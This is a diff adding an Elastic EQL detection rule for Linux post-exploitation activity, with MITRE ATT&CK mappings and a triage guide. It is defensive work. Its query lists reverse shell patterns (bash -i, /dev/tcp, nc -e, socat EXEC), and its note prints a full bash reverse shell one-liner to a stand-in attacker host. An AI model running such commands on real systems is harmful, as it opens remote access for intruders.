@@ -1,0 +1,143 @@
+[metadata]
+creation_date = "2025/01/01"
+integration = ["endpoint", "system"]
+maturity = "production"
+updated_date = "2026/05/04"
+
+[rule]
+author = ["Amit Ambekar / Safehouse"]
+description = """
+UEBA - Linux: Detects Linux-specific post-exploitation behavioral anomalies including
+reverse shell patterns (bash -i, socat, ncat, python pty), unusual outbound network
+connections from processes that should not make external connections, data staging
+and compression for exfiltration, and SUID binary creation which indicates privilege
+persistence setup. Deep Linux endpoint behavioral analytics.
+"""
+from = "now-9m"
+index = ["logs-endpoint.events.*", "logs-system.syslog-*", "filebeat-*"]
+language = "eql"
+license = "Elastic License v2"
+name = "UEBA Linux - Reverse Shell, Unusual Outbound Connection, or SUID Binary Creation"
+references = [
+  "https://attack.mitre.org/techniques/T1059/004/",
+  "https://attack.mitre.org/techniques/T1105/",
+  "https://attack.mitre.org/techniques/T1548.001/",
+]
+risk_score = 73
+rule_id = "a1b2c3d4-0020-4011-8001-000000000002"
+severity = "high"
+tags = [
+  "Domain: Endpoint",
+  "OS: Linux",
+  "Use Case: UEBA",
+  "Use Case: Threat Detection",
+  "Tactic: Execution",
+  "Tactic: Defense Evasion",
+  "Tactic: Privilege Escalation",
+  "Data Source: Elastic Defend",
+  "Resources: Investigation Guide",
+]
+timestamp_override = "event.ingested"
+type = "eql"
+
+query = '''
+any where host.os.type == "linux" and
+  (
+    /* Reverse shell patterns */
+    (event.category == "process" and event.type == "start" and
+      (
+        (process.name : "bash" and process.args : ("-i", ">& /dev/tcp/*", "0>&1")) or
+        (process.name : ("python*", "python3*") and
+          process.args : ("*pty.spawn*", "*socket*", "*/dev/tcp/*")) or
+        (process.name : ("nc", "ncat", "netcat") and
+          process.args : ("-e", "--exec", "-c") and
+          process.args : ("bash", "sh", "/bin/bash", "/bin/sh")) or
+        (process.name : "socat" and
+          process.args : ("*EXEC:*bash*", "*TCP*"))
+      )
+    ) or
+    /* SUID bit set on non-standard binary */
+    (event.category == "file" and event.type in ("change", "creation") and
+      file.mode : ("*4755*", "*4777*", "*6755*") and
+      not file.path : (
+        "/bin/*", "/usr/bin/*", "/usr/local/bin/*",
+        "/sbin/*", "/usr/sbin/*"
+      )
+    ) or
+    /* LD_PRELOAD injection for privilege escalation / evasion */
+    (event.category == "process" and event.type == "start" and
+      process.env_vars : ("LD_PRELOAD=*") and
+      not user.name : "root"
+    ) or
+    /* Unusual process making outbound connection on high port */
+    (event.category == "network" and
+      process.name : ("python*", "perl*", "ruby*", "php*", "java*") and
+      destination.port > 1024 and
+      not destination.ip : ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16") and
+      network.direction == "outbound"
+    ) or
+    /* /tmp or /dev/shm used for malware staging */
+    (event.category == "file" and event.type == "creation" and
+      file.path : ("/tmp/*", "/dev/shm/*", "/var/tmp/*") and
+      file.extension : ("sh", "py", "pl", "rb", "elf", "bin", "so") and
+      not process.name : ("pip*", "npm*", "apt*", "yum*", "dnf*")
+    )
+  )
+'''
+
+note = """## Triage and Analysis
+
+### UEBA Linux - Reverse Shell / Post-Exploitation
+
+#### Possible Investigation Steps
+- For reverse shell: identify the destination IP and port of the shell connection.
+- For SUID binary: analyse the binary — is it a known tool like find, vim, python with SUID?
+- For LD_PRELOAD: identify the library being preloaded and its contents.
+- For outbound scripting language connection: review what the script is doing and where it connects.
+
+### Key Threat Intelligence
+- `bash -i >& /dev/tcp/attacker.ip/4444 0>&1` is the most common reverse shell.
+- `/tmp` as a staging area with executable shell scripts is a classic post-exploitation IoC.
+
+### Response and Remediation
+- Block the reverse shell destination at the firewall immediately.
+- Kill the shell process and identify how it was established.
+- Remove any SUID bits on non-standard binaries.
+- Mount /tmp and /dev/shm with noexec flag.
+"""
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1059"
+name = "Command and Scripting Interpreter"
+reference = "https://attack.mitre.org/techniques/T1059/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1059.004"
+name = "Unix Shell"
+reference = "https://attack.mitre.org/techniques/T1059/004/"
+
+[rule.threat.tactic]
+id = "TA0002"
+name = "Execution"
+reference = "https://attack.mitre.org/tactics/TA0002/"
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1548"
+name = "Abuse Elevation Control Mechanism"
+reference = "https://attack.mitre.org/techniques/T1548/"
+
+[[rule.threat.technique.subtechnique]]
+id = "T1548.001"
+name = "Setuid and Setgid"
+reference = "https://attack.mitre.org/techniques/T1548/001/"
+
+[rule.threat.tactic]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/tactics/TA0004/"
